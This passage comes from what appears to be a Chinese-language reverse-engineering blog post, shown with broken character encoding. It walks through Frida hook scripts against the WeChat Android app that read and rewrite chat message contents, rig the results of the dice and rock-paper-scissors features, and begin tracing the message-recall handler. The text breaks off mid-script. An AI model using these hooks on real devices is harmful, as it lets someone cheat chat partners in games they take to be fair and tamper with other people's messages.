top</code>åˆ—å‡ºå½“å‰ç•Œé¢çš„å„ç§activityç±»(ç•Œé¢è¿˜æ˜¯ä¸ç”¨æˆ·èŠå¤©ç•Œé¢)ï¼Œç„¶åæœç´¢æ§ä»¶idå°±ä¼šç²¾å‡†å®šä½åˆ°ä¸€ä¸ªç±»</p><p><img src="/posts/5324751f.htm/image-20240609151254311.png" alt="image-20240609151254311"></p><p>gdaè·Ÿè¿›è¿›è¡Œåˆ†æ <code>com.tencent.mm.ui.chatting.view.MMChattingListView</code></p><h3 id="åˆ†æ-2">åˆ†æ</h3><p>ç¿»ä¸€ä¸‹å°±ä¼šæ‰¾åˆ°setAdapteræ–¹æ³•(é€†å‘è¿™ç§ä¸šåŠ¡appæ„Ÿè§‰çœŸçš„åƒå¼€å‘åŠŸåº•ï¼Œè€Œè‡ªå·±ä¸å’‹æ‡‚å¼€å‘â€¦)</p><p><img src="/posts/5324751f.htm/image-20240609151535307.png" alt="image-20240609151535307"></p><p>çœ‹äº†å“²ä½¬çš„Androidç¬”è®°å‘ç°è¿™é‡Œå¯èƒ½å°±æ˜¯ç»™ListViewè®¾ç½®äº†ä¸€ä¸ªé€‚é…å™¨ï¼Œè€Œthis.LNyå°±æ˜¯Adapterï¼Œç±»å‹ä¸ºBaseAdapterã€‚äº¤å‰å¼•ç”¨çœ‹çœ‹å“ªé‡Œä½¿ç”¨äº†setAdapteræ–¹æ³•ï¼Œå‘ç°fTJæ–¹æ³•</p><p><img src="/posts/5324751f.htm/image-20240609153639603.png" alt="image-20240609153639603"></p><p>Lrnæ˜¯é€‚é…å™¨ï¼Œç±»å‹ä¸ºcom.tencent.mm.ui.chatting.a.aï¼›</p><p>Lrræ˜¯ListViewï¼Œç±»å‹ä¸ºMMChattingListView</p><p>Lrnæ˜¯aç±»å‹ï¼Œè·Ÿè¿›è¿™ä¸ªcom.tencent.mm.ui.chatting.a.aç±»çœ‹çœ‹ï¼Œè¿™ä¸ªç±»åº”è¯¥æ˜¯å¯¹adapterçš„ç¼–å†™å®ç°å•¥çš„ã€‚</p><p>æ‰¾åˆ°ç¼–å†™adapterä¸­å…³é”®çš„å‡ ä¸ªæ–¹æ³•ï¼Œå¦‚getCount</p><p><img src="/posts/5324751f.htm/image-20240609154016621.png" alt="image-20240609154016621"></p><p>æ ¹æ®ä¸€èˆ¬getCountå®ç°çš„ç¼–å†™ï¼Œå¯ä»¥çŸ¥é“LtFæ˜¯æ•°æ®æºã€‚</p><p>æˆ‘ä»¬å¯ä»¥è°ƒç”¨<code>getCount()</code>æ–¹æ³•å’Œ<code>getItem()</code>è·å–åˆ°æ•°æ®æºçš„å•ä¸ªæ•°æ®</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">adapter</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> clazz = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&#x27;com.tencent.mm.ui.chatting.ChattingUIFragment&#x27;</span>);</span><br><span class="line">        clazz.<span class="property">zt</span>.<span class="property">implementation</span> = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;this.Lrn.value&quot;</span>,<span class="variable language_">this</span>.<span class="property">Lrn</span>.<span class="property">value</span>); <span class="comment">//è·å¾—Lrnçš„å€¼ Lrnæ˜¯ é€‚é…å™¨</span></span><br><span class="line">            <span class="comment">//åˆ›å»ºé€‚é…å™¨å¯¹è±¡ï¼Œæ“ä½œgetCount  getItem</span></span><br><span class="line">            <span class="keyword">var</span> adapter = <span class="title class_">Java</span>.<span class="title function_">cast</span>(<span class="variable language_">this</span>.<span class="property">Lrn</span>.<span class="property">value</span>,<span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.tencent.mm.ui.chatting.a.a&quot;</span>))</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;adapter&quot;</span>,adapter);</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;adapter.getCount&quot;</span>,adapter.<span class="title function_">getCount</span>());</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;LtF&quot;</span>,adapter.<span class="property">LtF</span>.<span class="property">value</span>);  <span class="comment">//LtFæ˜¯æ•°æ®æº</span></span><br><span class="line">            <span class="keyword">var</span> adapter_size = adapter.<span class="title function_">getCount</span>(); <span class="comment">//æ•°æ®æ•°é‡</span></span><br><span class="line">            <span class="keyword">var</span> msg = adapter.<span class="title function_">getItem</span>(<span class="number">0</span>);</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;msg&quot;</span>,msg);</span><br><span class="line">            <span class="keyword">return</span> clazz.<span class="property">zt</span>.<span class="title function_">apply</span>(<span class="variable language_">this</span>, <span class="variable language_">arguments</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//ç»“æœ</span></span><br><span class="line"><span class="variable language_">this</span>.<span class="property">Lrn</span>.<span class="property">value</span> com.<span class="property">tencent</span>.<span class="property">mm</span>.<span class="property">ui</span>.<span class="property">chatting</span>.<span class="property">a</span>.<span class="property">a</span>@eb2b4e4</span><br><span class="line">adapter com.<span class="property">tencent</span>.<span class="property">mm</span>.<span class="property">ui</span>.<span class="property">chatting</span>.<span class="property">a</span>.<span class="property">a</span>@eb2b4e4</span><br><span class="line">adapter.<span class="property">getCount</span> <span class="number">17</span>  <span class="comment">//èŠå¤©æ¡†æœ‰17æ¡æ¶ˆæ¯</span></span><br><span class="line"><span class="title class_">LtF</span> &#123;<span class="number">0</span>=com.<span class="property">tencent</span>.<span class="property">mm</span>.<span class="property">storage</span>.<span class="property">bz</span>@21a6784, <span class="number">1</span>=com.<span class="property">tencent</span>.<span class="property">mm</span>.<span class="property">storage</span>.<span class="property">bz</span>@4e07b6d, <span class="number">2</span>=com.<span class="property">tencent</span>.<span class="property">mm</span>.<span class="property">storage</span>.<span class="property">bz</span>@c7df3a2, <span class="number">3</span>=com.<span class="property">tencent</span>.<span class="property">mm</span>.<span class="property">storage</span>.<span class="property">bz</span>@<span class="number">3284833</span>, <span class="number">4</span>=com.<span class="property">tencent</span>.<span class="property">mm</span>.<span class="property">storage</span>.<span class="property">bz</span>@89877f0, <span class="number">5</span>=com.<span class="property">tencent</span>.<span class="property">mm</span>.<span class="property">storage</span>.<span class="property">bz</span>@<span class="number">1166169</span>, <span class="number">6</span>=com.<span class="property">tencent</span>.<span class="property">mm</span>.<span class="property">storage</span>.<span class="property">bz</span>@86ba7ee, <span class="number">7</span>=com.<span class="property">tencent</span>.<span class="property">mm</span>.<span class="property">storage</span>.<span class="property">bz</span>@315348f, <span class="number">8</span>=com.<span class="property">tencent</span>.<span class="property">mm</span>.<span class="property">storage</span>.<span class="property">bz</span>@ba5231c, <span class="number">9</span>=com.<span class="property">tencent</span>.<span class="property">mm</span>.<span class="property">storage</span>.<span class="property">bz</span>@9aaab25, <span class="number">10</span>=com.<span class="property">tencent</span>.<span class="property">mm</span>.<span class="property">storage</span>.<span class="property">bz</span>@16e54fa, <span class="number">11</span>=com.<span class="property">tencent</span>.<span class="property">mm</span>.<span class="property">storage</span>.<span class="property">bz</span>@d3a8aab, <span class="number">12</span>=com.<span class="property">tencent</span>.<span class="property">mm</span>.<span class="property">storage</span>.<span class="property">bz</span>@36f5508, <span class="number">13</span>=com.<span class="property">tencent</span>.<span class="property">mm</span>.<span class="property">storage</span>.<span class="property">bz</span>@e7fd4a1, <span class="number">14</span>=com.<span class="property">tencent</span>.<span class="property">mm</span>.<span class="property">storage</span>.<span class="property">bz</span>@4bcc6c6, <span class="number">15</span>=com.<span class="property">tencent</span>.<span class="property">mm</span>.<span class="property">storage</span>.<span class="property">bz</span>@c152687, <span class="number">16</span>=com.<span class="property">tencent</span>.<span class="property">mm</span>.<span class="property">storage</span>.<span class="property">bz</span>@a28b9b4&#125;</span><br><span class="line">msg com.<span class="property">tencent</span>.<span class="property">mm</span>.<span class="property">storage</span>.<span class="property">bz</span>@21a6784  <span class="comment">//æ•°æ®æºä¸­ç¬¬ä¸€ä¸ªæ¶ˆæ¯</span></span><br></pre></td></tr></table></figure><p>å¯ä»¥çŸ¥é“æ¯ä¸ªæ•°æ®éƒ½æ˜¯<code>com.tencent.mm.storage.bz</code>ç±»å‹çš„ã€‚</p><p>com.tencent.mm.storage.bzç±»ç»§æ‰¿ com.tencent.mm.ah.aaç±»</p><p>com.tencent.mm.ah.aaç±»ç»§æ‰¿com.tencent.mm.g.c.ejç±»</p><p>com.tencent.mm.g.c.ejç±»ç»§æ‰¿com.tencent.mm.sdk.e.cç±»</p><p>å‘ç°ejç±»ä¸­æœ‰ä¸ªå±æ€§ä¸ºfield_contentï¼ŒçŒœæµ‹ä»–æ˜¯å­˜æ”¾æ¶ˆæ¯å†…å®¹</p><h3 id="hookä¿®æ”¹æ¶ˆæ¯å†…å®¹">hookä¿®æ”¹æ¶ˆæ¯å†…å®¹</h3><p>è¿™é‡Œé€‰æ‹©hook notifyDataSetChanged()æ–¹æ³•å¯ä»¥ä¿®æ”¹æ¶ˆæ¯å†…å®¹</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">hook_notifyDataSetChanged</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> clazz = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&#x27;com.tencent.mm.ui.chatting.a.a&#x27;</span>);</span><br><span class="line">        clazz.<span class="property">notifyDataSetChanged</span>.<span class="property">implementation</span> = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;notifyDataSetChanged&quot;</span>);</span><br><span class="line">            <span class="keyword">var</span> data = <span class="variable language_">this</span>.<span class="property">LtF</span>.<span class="property">value</span>;</span><br><span class="line">            <span class="comment">//console.log(&quot;Ltf&quot;,data);</span></span><br><span class="line">            <span class="keyword">var</span> data_size = data.<span class="title function_">size</span>();  <span class="comment">//æ•°æ®æºæ•°é‡</span></span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;data_size&quot;</span>,data_size);</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>;i&lt;data_size;++i)&#123;</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Message&quot;</span>+i,<span class="title class_">Java</span>.<span class="title function_">cast</span>(data.<span class="title function_">get</span>(i),<span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.tencent.mm.storage.bz&quot;</span>)).<span class="property">field_content</span>.<span class="property">value</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="title class_">Java</span>.<span class="title function_">cast</span>(data.<span class="title function_">get</span>(<span class="number">5</span>),<span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.tencent.mm.storage.bz&quot;</span>)).<span class="property">field_content</span>.<span class="property">value</span> = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;java.lang.String&quot;</span>).$new(<span class="string">&quot;ä½ è¦ä¿®æ”¹çš„å†…å®¹&quot;</span>);</span><br><span class="line">             <span class="keyword">return</span> clazz.<span class="property">notifyDataSetChanged</span>.<span class="title function_">apply</span>(<span class="variable language_">this</span>, <span class="variable language_">arguments</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="VXæŠ•éª°å­">VXæŠ•éª°å­</h2><h3 id="å®šä½-2">å®šä½</h3><p>åŒæ · æ–¹æ³•å’Œä¸Šé¢å®šä½æ¶ˆæ¯å‘é€ä¸€æ ·</p><p>ç‚¹å‡»äº‹ä»¶ä¸º<code>com.tencent.mm.emoji.panel.a.q$1.onClick()</code></p><h3 id="åˆ†æ-3">åˆ†æ</h3><p><img src="/posts/5324751f.htm/image-20240609161000551.png" alt="image-20240609161000551"></p><p>è·Ÿè¿›&quot;glG.a&quot;æ–¹æ³•ï¼Œå³<code>com.tencent.mm.emoji.panel.a.d.a()</code></p><p><img src="/posts/5324751f.htm/image-20240609161502165.png" alt="image-20240609161502165"></p><p>å‘ç°æœ‰ä¸ªswitchï¼Œé‚£å°±hookä¸€ä¸‹è¿™ä¸ªå€¼æ˜¯å¤šå°‘ï¼Œå‘ä¸‹ä¼šæ‰§è¡Œå“ªä¸ªcaseè¯­å¥</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">hook</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="keyword">var</span> clazz=<span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.tencent.mm.emoji.panel.a.d&quot;</span>);</span><br><span class="line">        clazz.<span class="property">a</span>.<span class="title function_">overload</span>(<span class="string">&#x27;android.view.View&#x27;</span>, <span class="string">&#x27;android.content.Context&#x27;</span>, <span class="string">&#x27;int&#x27;</span>, <span class="string">&#x27;com.tencent.mm.emoji.a.b.ac&#x27;</span>).<span class="property">implementation</span>=<span class="keyword">function</span>(<span class="params">a,b,c,d</span>)&#123;        </span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">arguments</span>[<span class="number">3</span>].<span class="property">type</span>.<span class="property">value</span>); <span class="comment">//0</span></span><br><span class="line">         &#125;</span><br><span class="line">     &#125;);</span><br><span class="line"> &#125;</span><br><span class="line"><span class="comment">//è¿”å›å€¼ä¸º0ï¼Œæ‰€ä»¥æ‰§è¡Œcase 0</span></span><br></pre></td></tr></table></figure><p>å†çœ‹ä¸€ä¸‹ggJ1.getGroup()å€¼</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">hook_getGroup</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="title class_">EmojiInfo</span> = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.tencent.mm.storage.emotion.EmojiInfo&quot;</span>);</span><br><span class="line">    <span class="title class_">EmojiInfo</span>[<span class="string">&quot;getGroup&quot;</span>].<span class="property">implementation</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`EmojiInfo.getGroup is called`</span>);</span><br><span class="line">    <span class="keyword">let</span> result = <span class="variable language_">this</span>[<span class="string">&quot;getGroup&quot;</span>]();</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`EmojiInfo.getGroup result=<span class="subst">$&#123;result&#125;</span>`</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> <span class="title class_">EmojiGroupInfo</span> = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.tencent.mm.storage.emotion.EmojiGroupInfo&quot;</span>);</span><br><span class="line">    <span class="keyword">var</span> <span class="title class_">Qbd</span> = <span class="title class_">EmojiGroupInfo</span>.<span class="property">Qbd</span>.<span class="property">value</span>;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Qbd is called&quot;</span>,<span class="title class_">Qbd</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//æµ‹è¯•å‘ç°  EmojiGroupInfo.Qbd==18 </span></span><br><span class="line"><span class="comment">//å½“éª°å­ï¼ŒçŸ³å¤´å‰ªåˆ€å¸ƒæ—¶,EmojiInfo.getGroupä¸º18ï¼Œè‡ªå®šä¹‰è¡¨æƒ…EmojiInfo.getGroupä¸º81</span></span><br></pre></td></tr></table></figure><p>é‚£å°±<code>ggJ1.getGroup() == EmojiGroupInfo.Qbd</code>æˆç«‹ç»§ç»­å‘ä¸‹åˆ†ææœ‰ä¸€ä¸ªâ€œgetProvider().p(emojiInfo3)â€œ</p><p>jadxåŒå‡»è¿™ä¸ªå‡½æ•°å‘ç°ä»–è¿˜æ²¡æœ‰è¿›è¡Œå‡½æ•°ä½“å®ç°ï¼Œåº”è¯¥åœ¨åˆ«çš„åœ°æ–¹è¦†å†™å®ç°äº†ã€‚çœ‹çœ‹å“ªé‡Œå¼•ç”¨äº†è¿™ä¸ªæ–¹æ³•</p><p>æ‰¾åˆ°<code>com.tencent.mm.ca.a.p()</code>å’Œ<code>com.tencent.mm.plugin.emoji.e.f.p()</code></p><p>å› ä¸ºcom.tencent.mm.ca.a.p()å…ˆæ‰§è¡Œï¼Œæ‰€ä»¥å…ˆè·Ÿè¿›è¿™ä¸ªçœ‹ä¸€çœ‹ã€‚</p><p><img src="/posts/5324751f.htm/image-20240609164449481.png" alt="image-20240609164449481"></p><p>å‘ç°è°ƒç”¨äº†ä¸€ä¸ªpæ–¹æ³•  åº”è¯¥å°±æ˜¯<code>com.tencent.mm.plugin.emoji.e.f.p()</code>ï¼Œé‚£å°±è·Ÿè¿›è¿™ä¸ªçœ‹ä¸€çœ‹</p><p><img src="/posts/5324751f.htm/image-20240609164548935.png" alt="image-20240609164548935"></p><p>çœ‹åˆ°äº† ifæ¡ä»¶è¯­å¥ä¸­æœ‰<code>EmojiGroupInfo.Qbd</code>åº”è¯¥æ˜¯åœ¨åˆ¤æ–­ä½ å‘é€çš„è¡¨æƒ…åŒ…æ˜¯è‡ªå®šä¹‰è¿˜æ˜¯éª°å­ï¼ŒçŸ³å¤´å‰ªåˆ€å¸ƒã€‚</p><p>ä¸å‡ºæ„å¤–åº”è¯¥ä¼šæ‰§è¡Œåˆ°</p><p><img src="/posts/5324751f.htm/image-20240609164915361.png" alt="image-20240609164915361"></p><p>(hhï¼Œè¿™é‡Œæœ‰çœ‹å¼€å‘çŸ¥è¯†äº†ã€‚ã€‚ã€‚)</p><p>Cursoræ˜¯æ•°æ®åº“æ¸¸æ ‡ï¼Œaecæ¥å…·ä½“æŸ¥è¯¢å†…å®¹ã€‚moveToPosition()æ˜¯aecç§»åŠ¨åˆ°æŒ‡å®šä½ç½®ã€‚jEå°±æ˜¯ä¸ªintå€¼åº”è¯¥ã€‚<a href="http://xn--bu-uu2csb8068a.jE">çœ‹ä¸€ä¸‹bu.jE</a>()æ–¹æ³•ã€‚i=aec.getCount() - 1ï¼Œi2=0</p><p><img src="/posts/5324751f.htm/image-20240609165155541.png" alt="image-20240609165155541"></p><p>æœ‰ä¸€ä¸ªnextInt(n)å–éšæœºå€¼ï¼Œå–å€¼èŒƒå›´[0,n)ï¼Œè¿™é‡Œæ˜¯[0,aec.getCount() - 1]ã€‚</p><p>å°è¯•hookä¸€ä¸‹è¿™ä¸ªjEæ–¹æ³•ã€‚</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">hook_jE</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> bo = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&#x27;com.tencent.mm.sdk.platformtools.bu&#x27;</span>);</span><br><span class="line">    bo.<span class="property">jE</span>.<span class="title function_">overload</span>(<span class="string">&#x27;int&#x27;</span>,<span class="string">&#x27;int&#x27;</span>).<span class="property">implementation</span>=<span class="keyword">function</span>(<span class="params">a1,a2</span>)&#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;hook ii start&quot;</span>);</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;a1:&quot;</span>+a1);</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;a2:&quot;</span>+a2);</span><br><span class="line">        <span class="keyword">var</span> rtn= <span class="variable language_">this</span>.<span class="title function_">jE</span>(<span class="number">5</span>,<span class="number">0</span>);</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;rtn:&quot;</span>+rtn);</span><br><span class="line">        <span class="comment">//æ‰“å°è°ƒç”¨æ ˆ</span></span><br><span class="line">        <span class="keyword">var</span> threadef = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&#x27;java.lang.Thread&#x27;</span>);</span><br><span class="line">        <span class="keyword">var</span> threadinstance = threadef.$new();</span><br><span class="line">        <span class="keyword">var</span> stack = threadinstance.<span class="title function_">currentThread</span>().<span class="title function_">getStackTrace</span>();</span><br><span class="line">        <span class="keyword">function</span> <span class="title function_">Where</span>(<span class="params">stack</span>)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; stack.<span class="property">length</span>; ++i)&#123;</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(stack[i].<span class="title function_">toString</span>());</span><br><span class="line">            &#125;</span><br><span class="line">         &#125;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Full call stack:&quot;</span> + <span class="title class_">Where</span>(stack));</span><br><span class="line">        <span class="keyword">return</span> rtn</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>é€šè¿‡å¤šæ¬¡æµ‹è¯•çŸ¥é“ï¼Œå¦‚æœæ˜¯éª°å­ï¼Œi=5,i2=0ï¼Œå¦‚æœæ˜¯çŸ³å¤´å‰ªåˆ€å¸ƒi=2,i2=0ï¼Œæ‰€ä»¥å½“éª°å­æ—¶getCount()==6ï¼ŒçŸ³å¤´å‰ªåˆ€å¸ƒgetCount()==3ã€‚å¹¶ä¸”<strong>éª°å­ç»“æœæ˜¯jEè¿”å›å€¼+1</strong>ï¼Œ<strong>å‰ªåˆ€çŸ³å¤´å¸ƒåˆ†åˆ«å¯¹åº”ç€0 1 2</strong></p><h3 id="hookä¿®æ”¹éª°å­-çŸ³å¤´å‰ªåˆ€å¸ƒ">hookä¿®æ”¹éª°å­/çŸ³å¤´å‰ªåˆ€å¸ƒ</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">saizi</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">var</span> clazz = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&#x27;com.tencent.mm.sdk.platformtools.bu&#x27;</span>);</span><br><span class="line">        clazz.<span class="property">jE</span>.<span class="property">implementation</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>;i&lt;<span class="variable language_">arguments</span>.<span class="property">length</span>;i++)&#123;</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;bu.jE arguments&quot;</span>+i,<span class="variable language_">arguments</span>[i]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">var</span> result = clazz.<span class="property">jE</span>.<span class="title function_">apply</span>(<span class="variable language_">this</span>, <span class="variable language_">arguments</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable language_">arguments</span>[<span class="number">0</span>]==<span class="number">2</span>)&#123;</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;çŸ³å¤´å‰ªåˆ€å¸ƒç»“æœä¸º:&quot;</span>,result==<span class="number">0</span>?<span class="string">&quot;å‰ªåˆ€&quot;</span>:result==<span class="number">1</span>?<span class="string">&quot;çŸ³å¤´&quot;</span>:<span class="string">&quot;å¸ƒ&quot;</span>);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;éª°å­ç‚¹æ•°ä¸º:&quot;</span>,result+<span class="number">1</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// è¿›è¡Œä¿®æ”¹</span></span><br><span class="line">            result = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;java.lang.Integer&quot;</span>).<span class="built_in">parseInt</span>(<span class="string">&quot;5&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> result;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="vxé˜²æ’¤å›">vxé˜²æ’¤å›</h2><h3 id="å®šä½-3">å®šä½</h3><p>è¿™é‡Œå¯ä»¥æœç´¢å…³é”®å­—æ¥è¿›è¡Œå®šä½ï¼Œæœç´¢å…³é”®å­—ç¬¦ä¸²&quot;revoke&quot;ï¼Œå®šä½åˆ°ç±»<code>com.tencent.mm.plugin.msgquote.PluginMsgQuote.handleRevokeMsgBySvrId</code></p><h3 id="åˆ†æ-4">åˆ†æ</h3><p>æ¥åˆ°æ–¹æ³•<code>handleRevokeMsgBySvrId</code>çœ‹åå­—å‘ç°è¿™æ ·æ˜¯ä¸ªå¤„ç†æ’¤å›æ¶ˆæ¯çš„æ–¹æ³•ï¼Œé‚£çœ‹çœ‹å“ªé‡Œè°ƒç”¨äº†è¿™ä¸ªæ–¹æ³•ã€‚</p><p>å¯ä»¥æ‰“å°è¿™ä¸ªæ–¹æ³•çš„è°ƒç”¨æ ˆ</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">showstacks_handleRevokeMsgBySvrId</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> clazz = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&#x27;com.tencent.mm.plugin.msgquote.PluginMsgQuote&#x27;</span>);</span><br><span class="line">    clazz.<span class="property">handleRevokeMsgBySvrId</span>.<span class="property">implementation</span>=<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="keyword">var</span> threadef = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&#x27;java.lang.Thread&#x27;</span>);</span><br><span 